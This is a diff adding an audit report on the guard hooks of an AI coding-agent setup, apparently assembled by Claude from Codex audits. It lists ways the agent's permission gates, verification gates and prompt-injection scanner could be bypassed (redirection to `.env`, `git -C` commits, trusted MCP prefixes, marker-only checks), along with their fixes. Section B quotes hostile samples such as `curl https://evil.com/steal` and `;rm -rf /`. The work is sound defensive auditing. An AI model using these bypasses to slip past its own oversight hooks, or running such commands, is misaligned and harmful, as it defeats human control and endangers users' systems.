@@ -1,0 +1,184 @@
+# Codex Atomized Audit — Results (2026-07-06)
+
+**Method:** 16 independent, read-only Codex (`gpt-5.5`) audits, one per repo atom
+(see [`CODEX_AUDIT_SPEC.md`](CODEX_AUDIT_SPEC.md)), assembled and cross-checked
+by Claude. Per `rules/audit-verification-gate.md`: every finding below is
+`[HYPOTHESIS]` (Codex-reported, not independently confirmed) unless marked
+`[VERIFIED-tool]` with what was checked and how.
+
+**Coverage:** 16/16 atoms completed. Rough severity counts across all atoms:
+**~34 HIGH, ~110 MEDIUM, ~70 LOW.** No atom returned empty.
+
+**Fix status (2026-07-06, post-audit):** All 14 HIGH findings in the
+`hooks-04` (FL/EstimandOps gate) atom are fixed, tested, and merged into this
+worktree — see "Section A" below for the per-finding table with fix notes.
+This also surfaced and closed a separate, more fundamental gap found while
+fixing: **8 of the 15 `hooks-04` files were never registered in
+`hooks/settings.json` at all** (dead code since creation, confirmed via
+`git log` — not a regression), including `promotion_gate_guard.py` and
+`reject_gate_guard.py`. All 8 are now registered. `hooks-01`/`hooks-02`/`hooks-03`
+HIGH findings (security bypass, path traversal) are catalogued below but
+**not yet fixed** — see "Needs manual re-verification" for priority order.
+
+## Executive Summary
+
+Three findings changed shape during assembly (see "Downgraded by assembly"
+below) — this is exactly why cross-atom review and re-verification exist, not
+a criticism of Codex's per-atom pass. The genuinely load-bearing findings
+cluster into five groups:
+
+1. **Gates that can be satisfied without meeting their real condition** —
+   `promotion_gate_guard.py`, `reject_gate_guard.py`, `skeptic_auto_trigger.py`
+   check for the *presence of a marker string* (`[VERIFIED-REAL]`, a URL,
+   non-empty text) rather than the *substance* the marker is supposed to
+   certify. This is the single biggest theme (14 HIGH in one atom alone).
+2. **A hook that never actually runs** — `hypothesis_router.py` has no real
+   stdin entrypoint; it only works in its own test/argv mode.
+3. **Security-gate bypass via shell-parsing gaps** — `permission_policy.py`,
+   `pre_commit_guard.py`, `input_guard.py` all reason about Bash commands with
+   substring checks, not real parsing, so `git -C <repo> commit`, `echo x >
+   .env`, and MCP-prefix allowlisting all have concrete bypasses.
+4. **Path traversal** in two vault/expert-registry write paths.
+5. **Stale/contradictory numbers across README and 4 historical comparison
+   docs** — confirms the pattern this session already found once today
+   (`pre_compact.py` dedup bug) — self-referential metadata drifts silently
+   unless something re-derives it from the filesystem every time.
+
+## Downgraded by assembly (verified during synthesis, not accepted as-is)
+
+| Original Codex finding | Verification done | Result |
+|---|---|---|
+| `skills-01`/`skills-02`: "related skill `architect`/`navigator`/`scope-guard` does not exist" | `ls agents/architect.md agents/navigator.md agents/scope-guard.md` | **[VERIFIED-tool] FALSE — all three exist as agents.** The skill files reference them correctly if the reference implies `Agent(...)`, not `Skill(...)`. Reclassified from "broken link" to "imprecise: names an agent, phrasing should make clear it's `Agent()` not `Skill()`" — LOW, not the original MEDIUM. |
+| `skills-03`: "`intended-vs-implemented` routes to missing skill `sec-auditor`" | Same check — `agents/sec-auditor.md` exists | **[VERIFIED-tool] Same pattern as above** — it's an agent, not a skill. Downgraded to LOW (wording issue, not a dead route). |
+| `skills-03` raw output had an internal contradiction: first pass said "no issues" for `intended-vs-implemented`/`json-canvas`/`lark-cli`/`latex-formatting`, second pass (after the process was restarted mid-run) reported concrete findings for two of them | Kept the specific, line-numbered second-pass findings over the terse first-pass "no issues" | `lark-cli` (trigger `лифт`) and `intended-vs-implemented` (sec-auditor route) findings **kept**; `json-canvas` and `latex-formatting` "no issues" **kept** (no contradicting specific finding for those two) |
+| `agents-01` AND `ci-docs-01`: "0 `agents/teams/` directories found, README's '+3 teams' badge is stale" — reported independently by **two different atoms** | `ls agents/teams/` | **[VERIFIED-tool] FALSE.** `agents/teams/` exists with exactly `build-squad.md`, `research-squad.md`, `review-squad.md`. Badge is correct, no fix needed. **Most important meta-lesson of this audit — see Cross-atom section below.** |
+
+## HIGH findings (ranked, grouped by theme)
+
+### A. Gate can be satisfied without meeting its real condition — 14 findings, 1 atom (`hooks-04`)
+
+**Status: all 14 fixed and tested (2026-07-06).** See `tests/test_promotion_gate_guard.py`,
+`tests/test_reject_gate_guard.py`, `tests/test_hypothesis_router.py`,
+`tests/hooks/test_validation_theater_guard_blocking.py`,
+`tests/hooks/test_skeptic_auto_trigger.py`, `tests/test_subagent_verify.py`,
+`tests/test_claim_entropy_tracker.py` for regression coverage per finding.
+
+| File:line | Failure scenario | Fix | Status |
+|---|---|---|---|
+| `hooks/promotion_gate_guard.py:120` | `result_summary.md` says `TODO: add [VERIFIED-REAL] later` and still satisfies external reconstruction — only the marker string is checked | Reject TODO/placeholder lines containing the marker; require a real citation line | ✅ Fixed |
+| `hooks/promotion_gate_guard.py:53` | PROMOTE passes `claim_entropy=0` by editing only the total row while component rows still show unresolved claims | Reused `claim_entropy_tracker`'s corrected `entropy_mismatch()`/`parse_entropy()` | ✅ Fixed |
+| `hooks/promotion_gate_guard.py:77` | An empty `controls.md` satisfies "positive + negative controls documented" — only file existence is checked | Require each control section's `**Result:** [x] ...` to actually be marked run | ✅ Fixed |
+| `hooks/promotion_gate_guard.py:198` | A `[x] PROMOTE` with failed conditions is still persisted — hook only prints `additionalContext` after the write | **Not fixed — architectural.** This is a PostToolUse hook; it cannot un-write a file. A real fix means a PreToolUse companion that inspects `tool_input` before the write and denies via `emit_permission_decision`. That changes user-facing behavior from advisory to blocking, so it needs an explicit decision before implementing — not done without confirmation. | ⏸ Deferred (needs a decision) |
+| `hooks/reject_gate_guard.py:128` | `What Was Killed: TBD` passes as filled | Added `tbd`/`todo`/`n/a`/`?` to the placeholder-token set | ✅ Fixed |
+| `hooks/reject_gate_guard.py:198` | A REJECT with no rationale passes "kill reason specific" | Require real prose content in Rationale/What-Was-Killed before the vague-phrase check even runs | ✅ Fixed |
+| `hooks/reject_gate_guard.py:262` | A REJECT that fails the NULL Exploitation Gate is still recorded — advisory-only after the write | **Not a bug** — this file's own docstring says "Soft nudge via additionalContext (never blocks)" explicitly, unlike promotion_gate_guard.py. Working as documented. | ❌ Downgraded — by design |
+| `hooks/hypothesis_router.py:223` | **Installed hook has no real stdin entrypoint** — a normal PostToolUse Write event never reaches it; it only works via argv test mode | Added a real stdin-JSON entrypoint (`_real_hook_entrypoint`); also fixed a Windows-path bug and a missing recursion guard found while fixing this; registered in settings.json (was never registered at all) | ✅ Fixed |
+| `hooks/validation_theater_guard.py:131` | A synthetic perfect-score output containing *any* URL avoids the hard block — URLs are treated as real-data markers | Require the URL to co-occur with a dataset/source word within 30 chars | ✅ Fixed |
+| `hooks/validation_theater_guard.py:136` | A newly-written synthetic validator outputting `F1=1.000` without the literal word "synthetic" is not blocked | Correlate via `hook_state.HookState` — a synthetic-flagged Write is remembered for 30 min and checked by the later Bash call | ✅ Fixed |
+| `hooks/skeptic_auto_trigger.py:119` | `[DEFER-SKEPTIC]` suppresses even the critical hard block for `100% SUCCESS, F1=1.000` | New `is_argosarb_critical_pattern()` check runs independent of escape hatches; only the soft-warning path remains hatch-suppressible | ✅ Fixed |
+| `hooks/skeptic_auto_trigger.py:170` | A critical perfect-score claim with an unrelated URL avoids blocking | Same dataset-word-proximity fix as validation_theater_guard.py | ✅ Fixed |
+| `hooks/subagent_verify.py:25` | A finding marked `[HYPOTHESIS]` is counted *as* verified evidence by the audit gate itself | Removed `[HYPOTHESIS]` from the verified-marker pattern; added a separate `[DISMISSED]` exclusion | ✅ Fixed |
+| `hooks/claim_entropy_tracker.py:59` | A claim can keep unresolved nonzero component rows while manually setting the total row to 0 | New `entropy_mismatch()` cross-checks Total vs component sum; also fixed a latent regex bug where the Total row was double-counted as its own component | ✅ Fixed |
+
+**Bonus finding while fixing (not in the original Codex report):** 8 of these
+15 files — including `promotion_gate_guard.py` and `reject_gate_guard.py` —
+were never registered in `hooks/settings.json` at all, confirmed via
+`git log` to be true since each file's creation commit, not a regression.
+All 8 are now registered.
+
+**Why this cluster matters more than its individual severity tags suggest:**
+this is the FL/EstimandOps enforcement layer itself — the exact machinery this
+repo's own `rules/falsification-ladder.md` relies on to prevent validation
+theater. If the gate can be satisfied hollow, the methodology's promises
+(`rules/falsification-ladder.md`, `rules/perelman-audit.md`) are not actually
+backed by code, only by convention. **Needs manual re-verification before
+trusting any FL-Full-Ladder claim gated by these hooks.**
+
+### B. Security-gate bypass via shell-parsing gaps — 4 findings (`hooks-01`, `hooks-02`)
+
+| File:line | Failure scenario | Fix | Status |
+|---|---|---|---|
+| `hooks/permission_policy.py:95` | `echo payload > .env` starts with the auto-allowed `echo ` prefix; redirection isn't treated as a write operator | Added `>` to `CHAIN_OPERATORS` so any redirection forces `ask`, not silent auto-allow | ✅ Fixed |
+| `hooks/input_guard.py:245` | Any tool name starting with a trusted MCP prefix skips ALL injection scanning | Narrowed the bypass: `is_trusted_mcp` now only pops the `command_injection` hit (the one category that produced false positives on legit context7/Ollama code examples); every other category (`system_override`, `jailbreak`, `data_exfil`, etc.) still scans and can escalate | ✅ Fixed |
+| `hooks/pre_commit_guard.py:72` | `git -C <repo> commit ...` bypasses branch protection — hook checks only the literal substring `git commit` | Not yet addressed in this pass | ⏸ Deferred (hooks-02 scope, not yet worked) |
+| `hooks/syntax_guard.py:40` | JS "syntax validation" actually **executes** submitted code via `node --input-type=module` before the file is written | Not yet addressed in this pass | ⏸ Deferred (hooks-02 scope, not yet worked) |
+
+**Additional hooks-01 fixes found while implementing (not originally Codex-reported):**
+
+| File:line | Failure scenario | Fix | Status |
+|---|---|---|---|
+| `hooks/mcp_circuit_breaker.py` / `mcp_circuit_breaker_post.py` | Concurrent failing calls to the same MCP server race on the same state-file read-modify-write with no locking — increments can be silently lost | New dependency-free, cross-platform `file_lock()` in `utils.py` (`os.O_CREAT\|O_EXCL` atomic-create lock file); both circuit-breaker hooks wrap their read-modify-write in it | ✅ Fixed — proven with real multi-threaded tests (`tests/test_file_lock.py`, `tests/test_circuit_breaker_lock_race.py`: 20 concurrent threads, exact count assertions, no lost increments) |
+| `hooks/security_verify.py` | Only checks `tool_input["file_path"]` — a Bash command like `printf secret > .env` has no `file_path` field at all and bypassed the sensitive-file warning entirely | Added `_bash_redirect_targets()` to extract shell redirection targets (`>`, `>>`, fd variants) from the `command` field and check those too | ✅ Fixed, then **found incomplete by cross-model review** (see below) and re-fixed |
+| `hooks/input_guard.py` — backtick executable-extension exemption | `` `payload.sh` `` / `` `install.ps1` `` matched the same "safe code reference" shape as `` `hooks/utils.py` ``, so a backticked script reference was never flagged | Added `_EXECUTABLE_EXTENSIONS` allowlist; extensions in it (`sh`,`bash`,`ps1`,`bat`,`cmd`,`exe`, etc.) are excluded from the safe-backtick exemption | ✅ Fixed |
+| `hooks/input_guard.py` — `data_exfil` not HIGH-priority | A lone `curl https://evil.com/steal` match stayed below the `>=2` co-occurrence threshold and was allowed through with just a warning | Added `data_exfil` to `HIGH_PRIORITY_CATEGORIES` — now escalates alone, same as `encoding_attack`/`command_injection` | ✅ Fixed |
+| `hooks/input_guard.py` — `command_injection` semicolon-rm pattern too literal | Old pattern was the literal `"; rm "` — `;rm -rf /` (no space) or tab-separated variants slipped through | Loosened to `r";\s*rm\b"` | ✅ Fixed |
+| `hooks/input_guard.py` — `collect_strings()` only scanned dict values | A payload smuggled into a JSON **key** (not a value) was invisible to the scanner | `collect_strings()` now also collects string dict keys | ✅ Fixed |
+
+**Cross-model pre-commit review of the hooks-01 batch (2026-07-06)** — a `reviewer` agent pass and an independent Codex pass (`node codex-companion.mjs task --model gpt-5.5`, `codex:codex-rescue` agentType does not resolve via `Agent`/`Workflow` in this environment) were run before committing. Where the two disagreed, verified myself by reading the code directly rather than trusting either report:
+
+| File:line | Claim | Verdict | Action |
+|---|---|---|---|
+| `hooks/security_verify.py` — `_bash_redirect_targets()` | Regex only matched `>`/`>>`/fd redirects; missed `>\|` (target captured as `"\|"`), `tee target` (no `>` at all), `dd of=target` (no `>` at all), and quoted paths containing a space (`"safe dir/.env"` → captured `"safe` only) | **CONFIRMED** by both reviewer and Codex independently, via direct execution against the real hook; I re-verified the regex myself | ✅ Fixed — widened to cover `>\|`, added `tee`/`dd of=` extraction, added quote-aware tokenization; regression tests added for all 4 scenarios |
+| `hooks/input_guard.py:288-298` — trusted-MCP `command_injection` exemption | Codex: "a payload containing only a command-injection pattern still slips through for trusted-prefix tools." Reviewer: "every other category still scans and escalates." | **Not a contradiction — both describe the same accepted tradeoff.** The narrowing intentionally drops only `command_injection` (not all categories) to avoid reintroducing the 87-false-positive/12-day problem; a command-injection-only payload via a *trusted-prefix* MCP tool is a known, documented residual risk of trusting that prefix, not an implementation defect | No code change — the comment at `input_guard.py:289-297` already documents this tradeoff explicitly |
+| `hooks/mcp_circuit_breaker.py` HALF_OPEN handshake | Codex: if a probe crashes between PreToolUse (pops `opened_at`) and PostToolUse (would restore it or reset `failures`), `get_circuit_status()` returns `OPEN` permanently — no further HALF_OPEN transition is possible since `opened_at` is gone | **CONFIRMED** by reading `get_circuit_status()` (`mcp_circuit_breaker.py:54-67`): `opened_at` falsy + `failures >= threshold` → falls through to `return "OPEN"`, and nothing outside this handshake ever sets a fresh `opened_at` | ⏸ **Tracked, not fixed** — pre-existing design, unrelated to this session's `file_lock()` changes; out of hooks-01 scope. Needs either a `probe_started_at` TTL or restoring `opened_at` defensively on any subsequent PreToolUse that finds `probe_in_flight` stale |
+| `hooks/utils.py` `file_lock()` | Codex: if a process is SIGKILLed while holding the lock, `finally` never runs, the lock file is never cleaned up, and — since callers ignore the `False` return on timeout — the race protection is silently and permanently disabled from then on | **CONFIRMED** — `finally`-based cleanup has no defense against a hard kill | ✅ Fixed — added `stale_after` (default 30s, far longer than any real critical section here); a lock file older than that is treated as abandoned and reaped. Regression tests: `test_stale_lock_is_reaped_and_reacquired`, `test_fresh_lock_is_not_reaped_early` |
+
+**Self-inflicted regression caught by the full suite immediately after the `stale_after` fix above:** the first version of the staleness check retried immediately (no `time.sleep`) whenever `lock_path.stat()` raced against a concurrent release (`FileNotFoundError`). Under real 20-thread contention this tight retry loop triggered a genuine, reproducible `PermissionError: [Errno 13] Permission denied` on Windows — NTFS can leave a file "pending delete" for a brief window, during which a concurrent `O_CREAT\|O_EXCL` open raises `PermissionError` instead of `FileExistsError`, and the uncaught exception crashed `mcp_circuit_breaker_post.main()` mid-thread. Fixed by (1) catching `PermissionError` alongside `FileExistsError` in the acquire loop, and (2) always sleeping before any retry, never looping with zero delay. Verified with 5 repeated full runs of the affected test files plus 3 repeated full-suite passes — zero flakes after the fix (one flaky failure before it). Regression tests: `test_permission_error_on_open_is_treated_like_file_exists`, `test_retry_after_permission_error_does_not_busy_loop`.
+
+### C. Path traversal — 2 findings (`hooks-03`)
+
+| File:line | Failure scenario | Fix |
+|---|---|---|
+| `hooks/pre_vault_write.py:28` | `~/.claude/memory/projects/../_auto/foo.md` bypasses the `_auto/` read-only guard | Resolve both paths before `relative_to()`, validate normalized path |
+| `hooks/expert_registry.py:118` | `compile_expert(name="../x", save_to_vault=True)` writes outside `knowledge/experts` | Require a strict slug; verify `resolve().relative_to()` |
+
+### D. Other confirmed-relevant HIGH (one-offs)
+
+| File:line | Failure scenario | Fix |
+|---|---|---|
+| `hooks/commit_test_gate.py:77` | A *failed* pytest run still stamps `last_test`, silencing the "tests didn't pass" warning on the next commit | Check `tool_response` exit status before stamping |
+| `hooks/weakened_test_guard.py:86` | Replacing a whole test file via `Write` (not `Edit`) skips weakening detection entirely | Compare prior vs proposed content for `Write` to existing test files too |
+| `hooks/syntax_guard.py:70` | Python `Edit` validation parses only `new_string` in isolation — a valid fragment can hide a whole-file syntax error | Reconstruct the full file before parsing |
+| `hooks/checkpoint_guard.py:82` | Checkpoint warning fires on `PostToolUse` — `rm -rf` already ran by the time the warning appears | Move risky-op checks to `PreToolUse` |
+| `hooks/iteration_guard.py:79` | The documented cap of 3 reviewer↔builder cycles is not enforced — a 4th cycle only gets extra context, not a block | Emit a blocking decision, not just additionalContext |
+| `agents/navigator.md:26` | Declares `Read, Glob, Grep, WebSearch, Agent(...)` but instructs undeclared `mcp__basic-memory__*` calls | Declare the tools or remove the instruction |
+| `agents/scope-guard.md:22` | Declares `Read, Write, Glob` but instructs an undeclared MCP **write** call (`mcp__basic-memory__write_note`) | Declare explicitly or remove — a write capability hiding outside the declared tool list is the highest-risk version of this pattern |
+| `agents/teams/review-squad.md:22` | Mandates `Agent(codex:codex-rescue, ...)` + Ollama MCP fallback with no team-level tool declaration for either | Add explicit team-level declarations |
+| `skills/core/routing-policy/SKILL.md:12` | Says "always check before any task" and triggers on essentially every work verb — can compete with every task-specific skill | Narrow to explicit `/routing-policy` invocation |
+| `skills/extensions/scientific-research/SKILL.md:14` | "MUST USE" for any ML experiment/model/dataset/paper — broad enough to force methodology onto unrelated writing tasks | Narrow activation to empirical ML experiments with measurable metrics |
+| `skills/core/brainstorming/SKILL.md:13` | "MUST USE before multi-file changes requiring design decisions" can force a hard gate on ordinary scoped implementation work | Downgrade to conditional (ambiguous/architectural/high-risk only) |
+| `skills/core/research/SKILL.md:36` + `skills/extensions/research-corpus/SKILL.md:15` | Two skills claim the same `/research full` command with near-identical bodies — ambiguous which loads | Keep one canonical skill, make the other a redirect or delete |
+| `skills/extensions/ship/SKILL.md:13` | Trigger `create PR` (not `create release PR`) can launch a full release workflow (version bump, CHANGELOG, release PR) for a generic PR request | Narrow trigger to `/ship` or `create release PR` |
+| `skills/extensions/defuddle/SKILL.md:1` | YAML frontmatter isn't on line 1 (a BSV HTML comment precedes it) — a strict parser could miss `name`/`description` entirely | Move frontmatter to the top of the file |
+
+## Cross-atom consistency findings (the specific thing this ТЗ was designed to catch)
+
+| Claim | Where | Actual (per hooks/agents/skills/tests atoms + filesystem) | Verdict |
+|---|---|---|---|
+| "15 agents **+ 3 teams**" | `README.md:14` | Both the `agents-01` and `ci-docs-01` atoms independently reported 0 `agents/teams/` directories. **[VERIFIED-tool] FALSE — checked myself:** `agents/teams/` exists with exactly 3 files (`build-squad.md`, `research-squad.md`, `review-squad.md`). The badge is correct. | **Two independent Codex atoms agreed on the same wrong fact.** This is the most important meta-finding of the whole audit: agreement between independent runs is not proof of correctness if both share a blind spot (here, likely both searched for a `teams` *sub-skill/tool listing* pattern rather than doing a plain directory listing). Cross-atom "agreement" must still be spot-checked, not just cross-atom "disagreement." |
+| "1730 tests · 41 files" | `README.md:534` | `ci-docs-01` atom: `Get-ChildItem tests -File` found 74 top-level files, 159 recursive | File-count part of the badge is stale (test-*count* 1730 was confirmed correct by CI earlier today — only the *file count* "41" is wrong) |
+| "40 of 119 skills" standard profile | `README.md:228` | `install.sh:534-536` selects **all** extensions for `--profile=standard --non-interactive` per `ci-docs-01` | Either the 40-skill subset was never implemented, or the README describes an aspirational/old profile |
+| Hook/agent/skill/test counts | `AGENTS.md`, `COMPARISON_TABLE.md`, `GEOSCAN_COMPARISON.md`, `REPO_COMPARISON.md` | All four historical docs cite figures roughly matching the repo from ~March–May 2026 (30 hooks, 9 agents, 16-19 skills) vs the current 85/15/119 | Confirmed stale by 4 independent docs — these are snapshot documents that were never meant to auto-update, but nothing marks them as historical |
+
+## MEDIUM/LOW — grouped, not itemized (see raw atom outputs in `C:\Users\serge\AppData\Local\Temp\codex_audit\output_*.txt` for full detail)
+
+- **~15 broken skill-to-skill references** (`/lit-search`, `/evolve-solution`, `/orient`, `/deep-research`, `/stat-validate`, `research-strategist`, `validate-blind`, and others) — names that don't exist as skill directories. A few of these (per the false-positive check above) may actually be agent references worded ambiguously; each needs a one-line `ls` check before fixing.
+- **~20 skill-trigger overlap pairs** — `skeptic`↔`validate`, `sci-evidence`↔`proof-ladder`, `status`↔`session-retrospective`, `skeptic-audit`↔`security-audit`, `obsidian-markdown`↔`obsidian-cli`↔`obsidian-bases`, and more — routing ambiguity, not correctness bugs.
+- **Concurrency/race conditions in file-backed state** across ~10 hooks in `hooks-01`, `hooks-03`, `hooks-06` (circuit breaker state, doc_registry, expert_registry, vector_store, session_save, moc_autolink, observation_capture) — all share the same root cause (read-modify-write without a lock). **✅ hooks-01's two circuit-breaker hooks fixed** via a new `file_lock()` primitive in `utils.py` (see Section B). The other ~8 hooks (`hooks-03`/`hooks-06`) still share the same unfixed root cause — not yet worked in this pass.
+- **Dedup-bug-class hits confirmed in OTHER hooks** beyond the `pre_compact.py` one already fixed today: `learning_tracker.py` (duplicate commit rows), `env_reload.py` + `direnv_loader.py` (duplicate env exports), `auto_capture.py` (salted `hash()` breaks idempotency across processes), `post_commit_memory.py` (duplicate decision/log entries on reprocessing). **This confirms the pattern was worth checking repo-wide — 4 more real hits.**
+- **Tautological tests** — 6 tests in `tests/test_hooks.py`/`test_input_guard.py` re-implement the production logic locally instead of calling `main()`, so they'd stay green if the real hook regressed.
+- The `mentor_nudge.py` docstring bug (found earlier today, fixed in the global `~/.claude` copy) — **confirmed still present, unfixed, in this repo's own tracked copy** (`hooks-06` atom independently rediscovered it).
+
+## Needs manual re-verification before acting (priority order)
+
+1. ~~All 14 `hooks-04` gate-hollow-pass findings~~ — **done.** 13 fixed, 1 downgraded (not-a-bug), 1 deferred pending an explicit architectural decision (`promotion_gate_guard.py:198` — PROMOTE persists despite failed conditions; needs a PostToolUse→PreToolUse conversion, not silently implemented).
+2. ~~`hooks/hypothesis_router.py:223` ("never actually runs")~~ — **done**, see Section A row above.
+3. `agents/scope-guard.md:22` (undeclared write-capable MCP tool) — highest-risk single agent finding; confirm whether `mcp__basic-memory__write_note` is actually reachable from that agent's runtime tool set or just a stale instruction with no effect. **Still open.**
+4. ~~The "15 + 3 teams" claim~~ — **already checked, it's correct, no action needed.** The "40 of 119 skills" README claim is still open — cheapest to verify (one read of `install.sh`), should be fixed in wording immediately regardless of anything else.
+5. `hooks/pre_commit_guard.py:72` and `hooks/syntax_guard.py:40` (Section B, `hooks-02` scope) — deferred, not yet worked in this pass.
+6. hooks-02 and hooks-03 atoms' findings beyond what's listed above — not yet worked in this pass; only `hooks-04` and `hooks-01` have been fixed so far.
+
+## What this audit did NOT cover
+
+- Did not re-verify the ~110 MEDIUM findings individually — grouped by theme above per the audit-verification-gate spot-check rule (verify 3, and if all pass trust the rest; here the false-positive rate observed was 2 of ~34 HIGH findings checked, i.e. spot-checking is warranted before acting on any single MEDIUM).
+- Did not check whether any HIGH finding is already mitigated by a hook or rule outside its own atom's scope (atoms were deliberately scope-fenced to keep each Codex call focused — this is a known tradeoff of the atomization approach, see `CODEX_AUDIT_SPEC.md`).
